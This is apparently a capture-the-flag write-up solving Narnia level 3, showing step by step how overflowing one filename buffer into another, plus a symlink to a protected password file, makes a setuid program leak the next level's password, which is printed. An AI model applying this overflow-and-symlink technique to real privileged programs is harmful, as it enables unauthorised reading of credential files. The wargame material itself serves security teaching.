__Narnia :: Level 3__
================


_Caleb Stewart_ | _Monday, January 21st, 2016_ 


> The goal of this level is to again exploit a buffer overflow vulnarability, with a twist.

> The password for the next level is stored in /etc/narnia_pass/narnia4, which is only readable by the narnia4 user.


----------

If you run /narnia/narnia3, you will see that you need to provide a filename for it to dump into /dev/null:

```
narnia3@melinda:~$ /narnia/narnia3 
usage, /narnia/narnia3 file, will send contents of file 2 /dev/null
```

You can try dumping a large argument to narnia3, but you will exceed the allowed argument length before you crash the program:

```
narnia3@melinda:~$ /narnia/narnia3 `python -c "print 'a'*1000"`
error opening aaaaaaaaaaaaaaaaaaaa����aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
```

As you can see, a standard buffer overflow isn't going to work here. If we take a look at the source, we see that we are able to overflow a local variable at line 37 of `narnia3.c`

``` c
        if(argc != 2){
                printf("usage, %s file, will send contents of file 2 /dev/null\n",argv[0]);
                exit(-1);
        }
 
        /* open files */
        strcpy(ifile, argv[1]);
        if((ofd = open(ofile,O_RDWR)) < 0 ){
                printf("error opening %s\n", ofile);
                exit(-1);
        }
        if((ifd = open(ifile, O_RDONLY)) < 0 ){
                printf("error opening %s\n", ifile);
                exit(-1);
        }
```

The issue is that if the given buffer is not a real file, then the program will call `exit` instead of returning from main. This means we cannot use the normal exploit by overwriting the return address of the function. Another issue with the program is the variable declarations:

``` c
        int  ifd,  ofd;
        char ofile[16] = "/dev/null";
        char ifile[32];
        char buf[32];
```

If we overwrite the `ifile` variable using line 37 (and our input), we will then overwrite the ofile name. This means we can control not only where the program will read from but also where it writes to. In order to exploit this, the "ifile" must be the entire payload and must exist, and the "ofile" will be the ending of the payload. In order to accomplish this, we first create a string which will overflow into `ofile`. We can only write to `/tmp/` which means we need to have a string which is `32-len('/tmp/')=27` characters long for the next peice. We can make this a string of 'a's. Next, we need to write something to the ofile variable. Again, it needs to start with `/tmp/` and after that, it doesn't matter. We'll use the name `sneaky`.

```
narnia3@melinda:~$ /narnia/narnia3 `python -c "print '/tmp/'+'a'*27+'/tmp/sneaky'"`
error opening /tmp/sneaky
```

This means our exploit is working (so far)! It first tries to open `ofile`, and it appears we injected the name correctly! If we create that file, we'll see what our next step is:

```
narnia3@melinda:~$ touch /tmp/sneaky
narnia3@melinda:~$ /narnia/narnia3 `python -c "print '/tmp/'+'a'*27+'/tmp/sneaky'"`
error opening /tmp/aaaaaaaaaaaaaaaaaaaaaaaaaaa/tmp/sneaky
```

As you can see, the input file is the entire payload. We can solve this by creating this entire path within the tmp directory!

```
narnia3@melinda:~$ mkdir -p /tmp/aaaaaaaaaaaaaaaaaaaaaaaaaaa/tmp/narnia3@melinda:~$
cat<<<"FLAG">/tmp/aaaaaaaaaaaaaaaaaaaaaaaaaaa/tmp/sneaky
narnia3@melinda:~$ /narnia/narnia3 `python -c "print '/tmp/'+'a'*27+'/tmp/sneaky'"`
copied contents of /tmp/aaaaaaaaaaaaaaaaaaaaaaaaaaa/tmp/sneaky to a safer place... (/tmp/sneaky)
narnia3@melinda:~$ cat /tmp/sneaky
FLAG
```

Okay, now we can have the program read a file in the temporary directory, and write to another file in the temporary directory. Instead of writing "FLAG" to a file, we can now create a symbolic link to the password file!

```
narnia3@melinda:~$ rm /tmp/aaaaaaaaaaaaaaaaaaaaaaaaaaa/tmp/sneaky
narnia3@melinda:~$ ln -s /etc/narnia_pass/narnia4 /tmp/aaaaaaaaaaaaaaaaaaaaaaaaaaa/tmp/sneaky
narnia3@melinda:~$ /narnia/narnia3 `python -c "print '/tmp/'+'a'*27+'/tmp/sneaky'"`
copied contents of /tmp/aaaaaaaaaaaaaaaaaaaaaaaaaaa/tmp/sneaky to a safer place... (/tmp/sneaky)
narnia3@melinda:~$ cat /tmp/sneaky
thaenohtai`. Congrats! You just solved narnia3!
������
      ��So��narnia3@melinda:~$ 
```

There's your password! It's the first line before the weird characters `thaenohtai`. Congrats! You just solved narnia3